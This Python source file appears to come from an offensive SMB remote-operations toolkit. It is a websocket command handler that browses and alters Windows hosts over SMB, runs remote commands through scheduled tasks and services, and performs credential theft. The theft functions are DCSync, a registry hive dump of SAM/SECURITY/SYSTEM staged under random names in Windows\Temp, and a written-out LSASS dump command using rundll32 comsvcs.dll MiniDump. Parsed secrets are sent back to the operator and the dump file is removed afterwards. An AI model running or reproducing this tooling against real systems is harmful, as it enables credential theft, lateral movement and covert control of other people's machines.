import websockets
import asyncio
import uuid
import enum
import datetime
import base64
import os
import traceback

from aiosmbremote import logger
from aiosmbremote.protocol import *
from aiosmbremote.utils.regsecretsparser import parse_regfiles_unc
from aiosmbremote.utils.lsasssecretparser import parse_lsass

from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.commons.interfaces.directory import SMBDirectory

class dummyEnum(enum.Enum):
	UNKNOWN = 'UNKNOWN'

class ClientHandler:
	def __init__(self, ws, session_id = None, db_session = None, in_q = None, out_q = None, file_chunk_size_max = 65*1024*1024, file_chunk_size_min = 65*1024):
		self.ws :websockets.WebSocketCommonProtocol = ws
		self.in_q = in_q
		self.out_q = out_q
		self.db_session = db_session
		self.incoming_task = None
		self.send_full_exception = False
		self.file_chunk_size_max = file_chunk_size_max
		self.file_chunk_size_min = file_chunk_size_min
		self.session_id = session_id if session_id is not None else str(uuid.uuid4())

		self.connections = {} #connection_id -> smbmachine
		#self.shares = {} #connection_id -> {sharename} -> SMBShare
		self.__conn_id = 0
		self.__process_queues = {} #token -> in_queue
		self.__running_tasks = {} #token -> task

	def __get_connection_id(self):
		t = self.__conn_id
		self.__conn_id += 1
		return str(t)

	async def log_actions(self, cmd, state, msg):
		cmd = cmd.__dict__
		path = cmd.get('path')

		logd = {
			'timestamp' : datetime.datetime.utcnow().isoformat(),
			'sessionid' : self.session_id,
			'connectionid' : cmd.get('cid'),
			'token' : cmd.get('token'),
			'cmdtype' : cmd.get('type', dummyEnum.UNKNOWN).value,
			'state' : state,
			'path' : path,
			'msg' : msg,
		}

		logline = '[%s][%s][%s][%s][%s][%s][%s] %s' % (
			logd['timestamp'], 
			logd['sessionid'], 
			logd['connectionid'], 
			logd['token'], 
			logd['cmdtype'], 
			logd['state'], 
			logd['path'],
			logd['msg'],
		)
		logger.info(logline)
	
	async def log_start(self, cmd, msg = ''):
		await self.log_actions(cmd, 'START', msg)
	
	async def log_ok(self, cmd, msg = ''):
		await self.log_actions(cmd, 'DONE', msg)

	async def log_err(self, cmd, exc):
		await self.log_actions(cmd, 'ERR', str(exc)) #TODO: better exception formatting?

	async def terminate(self):
		#not a command, only called when the connection is lost so the smb clients can be shut down safely
		pass
	

	async def send_ok(self, cmd):
		try:
			reply = CMDOK(cmd.token)
			await self.log_ok(cmd)
			await self.out_q.put(reply.to_bytes())
			
		except Exception as e:
			print(e)

	async def send_continue(self, cmd):
		try:
			reply = CMDContinue(cmd.token)
			await self.out_q.put(reply.to_bytes())
		except Exception as e:
			print(e)

	async def send_err(self, cmd, reason, exc):
		try:
			extra = ''
			if self.send_full_exception is True:
				extra = str(exc)
			reply = CMDErr(cmd.token, reason, extra)
			await self.log_err(cmd, exc)
			await self.out_q.put(reply.to_bytes())
		except Exception as e:
			print(e)


	async def connect(self, cmd): #OK, ERR
		try:
			await self.log_start(cmd)
			conn_url = SMBConnectionURL(cmd.url)
			connection  = conn_url.get_connection()
			_, err = await connection.login()
			if err is not None:
				raise err
			machine = SMBMachine(connection)
			cid = self.__get_connection_id()
			self.connections[cid] = machine
			
			reply = CMDConnection(cmd.token, cid)
			await self.out_q.put(reply.to_bytes())
			await self.send_ok(cmd)

		except Exception as e:
			logger.exception('connect')
			await self.send_err(cmd, 'SMB Connection failed', e)

	async def webconnect(self, cmd):
		try:
			raise NotImplementedError()
			#print(1)
			#conn_url = SMBConnectionURL(cmd.url)
			#connection  = conn_url.get_connection()
			#_, err = await connection.login()
			#if err is not None:
			#	raise err
			#machine = SMBMachine(connection)
			#cid = self.__get_connection_id()
			#self.connections[cid] = machine
			#
			#reply = CMDConnection(cmd.token, cid)
			#print(reply.to_bytes())
			#await self.out_q.put(reply.to_bytes())
			#await self.send_ok(cmd)

		except Exception as e:
			logger.exception('webconnect')
			await self.send_err(cmd, 'SMB Web Connection failed', e)

	async def __disconnect_cid(self, cid, delete_connection = True):
		try:
			await self.connections[cid].close()
			if delete_connection is True:
				del self.connections[cid]
			return True, None
		except Exception as e:
			logger.exception('__disconnect_cid')
			return False, e

	async def __disconnect_all(self):
		logger.info('__disconnect_all')
		to_delete = []
		for cid in self.connections:
			await self.__disconnect_cid(cid, False)
			to_delete.append(cid)
		for td in to_delete:
			del self.connections[td]

	async def disconnect(self, cmd):
		try:
			await self.log_start(cmd)
			_, err = await self.__disconnect_cid(cmd.cid)
			if err is not None:
				raise err
			
			await self.send_ok(cmd)

		except Exception as e:
			logger.exception('disconnect')
			await self.send_err(cmd, 'SMB Disconnect failed', e)
			

	async def list_shares(self, cmd): #OK, ERR, SHARE
		try:
			await self.log_start(cmd)
			async for share, err in self.connections[cmd.cid].list_shares():
				if err is not None:
					raise err
				
				reply = CMDShare(cmd.token, str(cmd.cid), share.name)
				print('reply: %s' % reply.to_bytes())
				await self.out_q.put(reply.to_bytes())
			
			await self.send_ok(cmd)

		except Exception as e:
			logger.exception('list_share')
			await self.send_err(cmd, 'SMB Share list failed', e)
	
	async def use_share(self, cmd): #OK, ERR
		pass

	async def list_folder(self, cmd): #OK, ERR, FILE_ENTRY 
		#FILE_ENTRY = 'FILE_ENTRY' #reply
		# C$\\Windows\\
		try:
			await self.log_start(cmd)
			sharename, dir_path = cmd.path.split('\\', 1)
			if dir_path is None:
				dir_path = ''
			share = SMBShare.from_unc('\\\\%s\\%s' % (self.connections[cmd.cid].connection.target.get_hostname_or_ip(), sharename))
			_, err = await share.connect(self.connections[cmd.cid].connection)
			if err is not None:
				raise Exception('Failed to connect to share! Reason: %s' % err)

			directory = SMBDirectory()
			directory.tree_id = share.tree_id
			directory.fullpath = dir_path
			directory.unc_path = '\\\\%s\\%s' % (self.connections[cmd.cid].connection.target.get_hostname_or_ip(), cmd.path)
			_, err = await directory.list(self.connections[cmd.cid].connection)
			if err is not None:
				raise Exception('Failed to list directory! Reason: %s' % err)

			for filename in directory.files:
				print(filename)
				reply = CMDFSEntry.from_smbfile(cmd.token, cmd.cid, True, directory.files[filename])
				await self.out_q.put(reply.to_bytes())

			for dirname in directory.subdirs:
				print(dirname)
				reply = CMDFSEntry.from_smbfile(cmd.token, cmd.cid, False, directory.subdirs[dirname])
				await self.out_q.put(reply.to_bytes())

			# TODO: disconnect treeid!!!!

			await self.send_ok(cmd)

		except Exception as e:
			logger.exception('list_share')
			await self.send_err(cmd, 'SMB Share list failed', e)

	async def get_file_data(self, cmd): #OK, ERR, FILE_DATA
		smbfile = None
		try:
			await self.log_start(cmd)
			smbfile = SMBFile.from_remotepath(self.connections[cmd.cid].connection, cmd.path)
			_, err = await smbfile.open(self.connections[cmd.cid].connection)
			if err is not None:
				raise err

			file_chunk_size = max(self.file_chunk_size_min, min(self.file_chunk_size_max, smbfile.size // 100))

			buffer = b''
			offset = 0
			async for data, err in smbfile.read_chunked():
				if err is not None:
					raise err
				
				if data is None:
					break
				
				await asyncio.sleep(0)
				buffer += data
				if len(buffer) >= file_chunk_size:
					reply = CMDFileData(cmd.cid, cmd.token, buffer[:file_chunk_size], offset, smbfile.size)
					buffer = buffer[file_chunk_size:]
					offset += len(buffer)
					await self.out_q.put(reply.to_bytes())
			
			if len(buffer) > 0:
				reply = CMDFileData(cmd.cid, cmd.token, buffer, offset, smbfile.size)
				buffer = b''
				offset = 0
				await self.out_q.put(reply.to_bytes())
			
			await self.send_ok(cmd)

		except Exception as e:
			logger.exception('get_file_data')
			await self.send_err(cmd, 'SMB Get file data failed', e)
		finally:
			if smbfile is not None:
				await smbfile.close()

	async def get_entry_sd(self, cmd): #OK, ERR, FILE_SD
		try:
			await self.log_start(cmd)
			if cmd.is_file is True:
				smbfile = SMBFile.from_remotepath(self.connections[cmd.cid].connection, cmd.path)
				res, err = await smbfile.get_security_descriptor(self.connections[cmd.cid].connection)
				if err is not None:
					raise err
				
				reply = CMDFSEntrySD(cmd.token, cmd.cid, cmd.path, res.to_sddl(), res.to_bytes().hex() )
				await self.out_q.put(reply.to_bytes())
			else:
				smbdir = SMBDirectory.from_remotepath(self.connections[cmd.cid].connection, cmd.path)
				res, err = await smbdir.get_security_descriptor(self.connections[cmd.cid].connection)
				if err is not None:
					raise err
				
				reply = CMDFSEntrySD(cmd.token, cmd.cid, cmd.path, res.to_sddl(), res.to_bytes().hex() )
				await self.out_q.put(reply.to_bytes())

			await self.send_ok(cmd)
		except Exception as e:
			logger.exception('get_entry_sd')
			await self.send_err(cmd, 'SMB get SD failed', e)

	async def do_dcsync(self, cmd): #OK, ERR CMDUserSecret
		try:
			await self.log_start(cmd)
			async for res, err in self.connections[cmd.cid].dcsync(cmd.username):
				await asyncio.sleep(0)
				if err is not None:
					raise err
				
				reply = CMDUserSecret.from_smbuserecret(cmd.cid, cmd.token, res)
				await self.out_q.put(reply.to_bytes())

			await self.send_ok(cmd)
		except Exception as e:
			logger.exception('do_dcsync')
			await self.send_err(cmd, 'SMB Dcsync failed', e)


	async def do_stop(self, cmd):
		try:
			await self.log_start(cmd)
			self.__running_tasks[cmd.token].cancel()

		except Exception as e:
			logger.exception('do_stop')
			await self.send_err(cmd, 'Stop failed', e)

	
	async def list_tasks(self, cmd):
		try:
			await self.log_start(cmd)
			async for res, err in await self.connections[cmd.cid].tasks_list():
				if err is not None:
					raise err
				
				reply = CMDTaskEntry(cmd.token, cmd.cid, res)
				await self.out_q.put(reply.to_bytes())
			
			await self.send_ok(cmd)

		
		except Exception as e:
			logger.exception('list_tasks')
			await self.send_err(cmd, 'SMB task list failed', e)

	
	async def do_taskcmdexec(self, cmd):
		try:
			await self.log_start(cmd, cmd.command)
			_, err = await self.connections[cmd.cid].tasks_execute_commands([cmd.command])
			if err is not None:
				raise err
			
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('do_taskcmdexec')
			await self.send_err(cmd, 'SMB task command execution failed', e)

	async def list_interfaces(self, cmd):
		try:
			await self.log_start(cmd)
			interfaces, err = await self.connections[cmd.cid].list_interfaces()
			if err is not None:
				raise err
			
			for iface in interfaces:
				reply = CMDInterfaceEntry(cmd.token, cmd.cid, iface['index'], iface['address'])
				await self.out_q.put(reply.to_bytes())
			
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('list_interfaces')
			await self.send_err(cmd, 'SMB interfaces list failed', e)

	async def list_services(self, cmd):
		try:
			await self.log_start(cmd)
			async for service, err in self.connections[cmd.cid].list_services():
				if err is not None:
					raise err
				
				reply = CMDServiceEntry(cmd.token, cmd.cid, service.name, service.display_name, service.status.value)
				await self.out_q.put(reply.to_bytes())

			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('list_services')
			await self.send_err(cmd, 'SMB services list failed', e)

	async def create_service(self, cmd):
		try:
			await self.log_start(cmd, '%s,%s,%s' % (cmd.name, cmd.display_name, cmd.command))
			_, err = await self.connections[cmd.cid].create_service(cmd.name, cmd.display_name, cmd.command)
			if err is not None:
				raise err
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('create_service')
			await self.send_err(cmd, 'SMB service create failed', e)


	async def start_service(self, cmd):
		try:
			await self.log_start(cmd, '%s' % (cmd.name))
			_, err = await self.connections[cmd.cid].start_service(cmd.name)
			if err is not None:
				raise err
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('start_service')
			await self.send_err(cmd, 'SMB service start failed', e)

	async def control_service(self, cmd):
		try:
			await self.log_start(cmd, '%s:%s' % (cmd.name, cmd.status))
			if cmd.status.upper() == 'STOP':
				_, err = await self.connections[cmd.cid].stop_service(cmd.name)
			
			if err is not None:
				raise err
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('control_service')
			await self.send_err(cmd, 'SMB service control failed', e)

	async def del_task(self, cmd):
		try:
			await self.log_start(cmd, cmd.name)
			_, err = await self.connections[cmd.cid].tasks_delete(cmd.name)
			if err is not None:
				raise err
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('del_task')
			await self.send_err(cmd, 'SMB task delete failed', e)

	async def create_task(self, cmd):
		try:
			await self.log_start(cmd, cmd.xmldata)
			_, err = await self.connections[cmd.cid].tasks_register(cmd.xmldata)
			if err is not None:
				raise err
			await self.send_ok(cmd)
		
		except Exception as e:
			logger.exception('create_task')
			await self.send_err(cmd, 'SMB task create failed', e)

	

	async def delete_entry(self, cmd): #OK, ERR
		try:
			await self.log_start(cmd)
			if cmd.is_file is True:
				_, err = await SMBFile.delete_unc(self.connections[cmd.cid].connection, cmd.path)
				if err is not None:
					raise err
				await self.send_ok(cmd)
				return
			else:
				_, err = await SMBDirectory.delete_unc(self.connections[cmd.cid].connection, cmd.path)
				if err is not None:
					raise err
				await self.send_ok(cmd)
				return

		except Exception as e:
			logger.exception('delete_entry')
			await self.send_err(cmd, 'SMB Delete entry failed', e)

	async def create_entry(self, cmd): #OK, ERR
		try:
			await self.log_start(cmd)
			if cmd.is_file is True:
				smbfile = SMBFile.from_remotepath(self.connections[cmd.cid].connection, cmd.path)
				_, err = await smbfile.open(self.connections[cmd.cid].connection, 'w')
				if err is not None:
					raise err
				in_q = asyncio.Queue()
				self.__process_queues[cmd.token] = in_q
				asyncio.create_task(self.__file_write_handle(cmd.token, cmd.cid, in_q, smbfile))
				await self.send_continue(cmd)
				return
			else:
				_, err = await SMBDirectory.create_remote(self.connections[cmd.cid].connection, cmd.path)
				if err is not None:
					raise err
				await self.send_ok(cmd)
				return

		except Exception as e:
			logger.exception('create_entry')
			await self.send_err(cmd, 'SMB Create entry failed', e)

	async def __file_write_handle(self, token, cid, in_q, smbfile):
		try:
			while True:
				cmd = await in_q.get()
				if cmd.type == CMDType.OK:
					#we are cone here!
					await self.send_ok(cmd)
					return
				elif cmd.type == CMDType.FILE_DATA:
					#print('FILE_DATA_PROCESS')
					#print('offset %s' % cmd.offset)
					#print('data %s' % cmd.data)
					total_writen, err = await smbfile.write(cmd.data)
					if err is not None:
						raise err
					await asyncio.sleep(0)
					await self.send_continue(cmd)

		except Exception as e:
			logger.exception('process_file_data')
			await self.send_err(cmd, 'SMB process_file_data failed', e)
			return
		finally:
			await smbfile.close()
			del self.__process_queues[token]


	async def get_regsecret(self, cmd):
		try:
			await self.log_start(cmd)
			use_share = 'C$'
			use_dir = 'Windows\\Temp'
			bpath = '%s:\\%s' % (use_share[0], use_dir)
			uncbp = '\\%s\\%s' % (use_share, use_dir)
			samh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
			sech = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
			sysh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
			reshname = {
				'SAM' : '%s\\%s' % (bpath, samh),
				'SAM_remote' : '%s\\%s' % (uncbp, samh),
				'SAM_unc' : '\\\\%s%s\\%s' % (self.connections[cmd.cid].connection.target.get_hostname_or_ip() ,uncbp, samh),
				'SECURITY' : '%s\\%s' % (bpath, sech),
				'SECURITY_unc' : '\\\\%s%s\\%s' % (self.connections[cmd.cid].connection.target.get_hostname_or_ip() ,uncbp, sech),
				'SECURITY_remote' : '%s\\%s' % (uncbp, sech),
				'SYSTEM' : '%s\\%s' % (bpath, sysh),
				'SYSTEM_remote' : '%s\\%s' % (uncbp, sysh),
				'SYSTEM_unc' : '\\\\%s%s\\%s' % (self.connections[cmd.cid].connection.target.get_hostname_or_ip() ,uncbp, sysh),
			}
			err = None
			for _ in range(2):
				for hive_name in ['HKLM\\SAM', 'HKLM\\SECURITY', 'HKLM\\SYSTEM']:
					logger.info('[+] REGDUMP Dumping %s hive to remote path' % hive_name)
					_, err = await self.connections[cmd.cid].save_registry_hive(hive_name, reshname[hive_name.replace('HKLM\\','')])
					if err is not None:
						if str(err).find('PIPE_NOT_AVAILABLE') != -1:
							break
						else:
							logger.info('[-] Failed to dump %s hive Reason: %s' % (hive_name, traceback.format_tb(err.__traceback__)))
							raise err
				if err is None:
					break
			if err is not None:
				raise err

			await asyncio.sleep(5) # sleeping for a bit because the files might not have been written to the remote disk yet
			logger.info('[+] REGDUMP Dumping part complete, now parsing the files!')
			po, err = await parse_regfiles_unc(self.connections[cmd.cid].connection, reshname['SYSTEM_unc'], reshname['SAM_unc'], reshname['SECURITY_unc'])
			if err is not None:
				raise err
			

			reply = CMDRegSecret(cmd.token, cmd.cid, base64.b64encode(str(po).encode()).decode())
			await self.out_q.put(reply.to_bytes())
			await self.send_ok(cmd)

		
		except Exception as e:
			logger.exception('get_regsecret')
			await self.send_err(cmd, 'SMB registry secret parse failed', e)
	
	async def get_lsasssecret(self, cmd):
		lsass_dump_uncpath = None
		outfolder = None
		try:
			await self.log_start(cmd)
			#async def smb_task_lsass_dll( outfolder = None,  procdump_local_path = 'bins', is_32 = False):
			use_share = 'C$'
			use_dir = 'Windows\\Temp'

			if use_dir[-1] == '\\':
				use_dir = use_dir[:-1]
			if use_dir[0] == '\\':
				use_dir = use_dir[1:]

			remdir = '%s:\\%s\\' % (use_share, use_dir)
			if use_share[-1] == '$':
				remdir = '%s:\\%s\\' % (use_share[:-1], use_dir)

			remfile = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
			lsass_dump_uncpath = '\\%s\\%s\\%s' % (use_share, use_dir, remfile)

			dumpcmd_cmd = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
						remdir, remfile
						)

			dumpcmd_ps = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
				remdir, remfile
			)

			#print(dumpcmd_cmd)
			#print(dumpcmd_ps)

			_, err = await self.connections[cmd.cid].tasks_execute_commands([dumpcmd_cmd])
			if err is not None:
				logger.info('[+] Failed to schedule remote task!')
				raise err
				
			logger.info('[+] Task scheduled, waiting 5 seconds for the dump file to be created...')
			await asyncio.sleep(5)
				
			logger.info('[+] Parsing LSASS dump...')
			res, err = await parse_lsass(self.connections[cmd.cid], lsass_dump_uncpath)
			if err is not None:
				logger.info('[+] LSASS dump failed to parse :(')
				
				if outfolder is not None:
					file_name = 'lsass.dmp'
					file_obj = SMBFile.from_remotepath(self.connections[cmd.cid].connection, lsass_dump_uncpath)
					with open(outfolder.joinpath(file_name), 'wb') as outfile:
						async for data, err in self.connections[cmd.cid].get_file_data(file_obj):
							if err is not None:
								raise err
							if data is None:
								break
							outfile.write(data)
					await file_obj.close()
				raise err

				
			logger.info('[+] LSASS dump parsed correctly!')
			res_txt = base64.b64encode(str(res).encode()).decode()
			res_grep = base64.b64encode(res.to_grep().encode()).decode()
			res_json = base64.b64encode(res.to_json().encode()).decode()
			reply = CMDLsassSecret(cmd.token, cmd.cid, res_txt, res_grep, res_json)
			await self.out_q.put(reply.to_bytes())
			await self.send_ok(cmd)		


		except Exception as e:
			logger.exception('get_lsasssecret')
			await self.send_err(cmd, 'SMB lsass secret parse failed', e)
		
		finally:
			if lsass_dump_uncpath is not None:
				_, err = await SMBFile.delete_unc(self.connections[cmd.cid].connection, lsass_dump_uncpath)
				if err is not None:
					logger.info('[-] Failed to remove remote file!')
				else:
					logger.info('[+] Remote LSASS dump file removed')

	async def handle_ws_incoming(self):
		while not self.ws.closed:
			data = await self.ws.recv()
			await self.in_q.put(data)
	
	async def handle_ws_outgoing(self):
		while not self.ws.closed:
			data = await self.out_q.get()
			await self.ws.send(data)
	
	async def handle_incoming(self):
		try:
			while True:
				try:
					data_raw = await self.in_q.get() #await self.ws.recv()
					#print('data_raw %s' % repr(data_raw))
					
					try:
						cmd = CMD.from_bytes(data_raw)
					except Exception as e:
						logger.exception('CMD raw parsing failed! %s' % repr(data_raw))
						continue

					if cmd.token in self.__process_queues:
						await self.__process_queues[cmd.token].put(cmd)
						continue
					
					if cmd.type == CMDType.CONNECT: 
						self.__running_tasks[cmd.token] = asyncio.create_task(self.connect(cmd))
					elif cmd.type == CMDType.WEBCONNECT: 
						self.__running_tasks[cmd.token] = asyncio.create_task(self.webconnect(cmd))
					elif cmd.type == CMDType.DISCONNECT: 
						self.__running_tasks[cmd.token] = asyncio.create_task(self.disconnect(cmd))
					elif cmd.type == CMDType.STOP:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.do_stop(cmd))
					elif cmd.type == CMDType.LIST_SHARES:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.list_shares(cmd))
					elif cmd.type == CMDType.USE_SHARE:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.use_share(cmd))
					elif cmd.type == CMDType.LIST_DIRECTORY:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.list_folder(cmd))
					elif cmd.type == CMDType.GET_FILE_DATA:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.get_file_data(cmd))
					elif cmd.type == CMDType.GET_FSENTRY_SD:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.get_entry_sd(cmd))
					elif cmd.type == CMDType.DELETE_ENTRY: 
						self.__running_tasks[cmd.token] = asyncio.create_task(self.delete_entry(cmd))
					elif cmd.type == CMDType.CREATE_ENTRY:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.create_entry(cmd))
					elif cmd.type == CMDType.FILE_DATA:
						await self.send_err(cmd, 'Unexpected token for file data!', '')
					elif cmd.type == CMDType.DCSYNC:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.do_dcsync(cmd))
					elif cmd.type == CMDType.LIST_TASKS:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.list_tasks(cmd))
					elif cmd.type == CMDType.DELETE_TASK:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.del_task(cmd))
					elif cmd.type == CMDType.LIST_INTERFACES:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.list_interfaces(cmd))
					elif cmd.type == CMDType.TASKCMDEXEC:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.do_taskcmdexec(cmd))
					elif cmd.type == CMDType.CREATE_TASK:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.create_task(cmd))
					elif cmd.type == CMDType.LIST_SERVICES:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.list_services(cmd))
					elif cmd.type == CMDType.CREATE_SERVICE:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.create_service(cmd))
					elif cmd.type == CMDType.START_SERVICE:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.start_service(cmd))
					elif cmd.type == CMDType.CONTROL_SERVICE:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.control_service(cmd))
					elif cmd.type == CMDType.GET_SECRET_REGISTRY:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.get_regsecret(cmd))
					elif cmd.type == CMDType.GET_SECRET_LSASS:
						self.__running_tasks[cmd.token] = asyncio.create_task(self.get_lsasssecret(cmd))
						
						
						
				except Exception as e:
					logger.exception('handle_incoming')
					return
		finally:
			await self.__disconnect_all()

	async def run(self):
		if self.ws is not None:
			self.in_q = asyncio.Queue()
			self.out_q = asyncio.Queue()
			asyncio.create_task(self.handle_ws_incoming())
			asyncio.create_task(self.handle_ws_outgoing())

		self.incoming_task = asyncio.create_task(self.handle_incoming())
		await self.incoming_task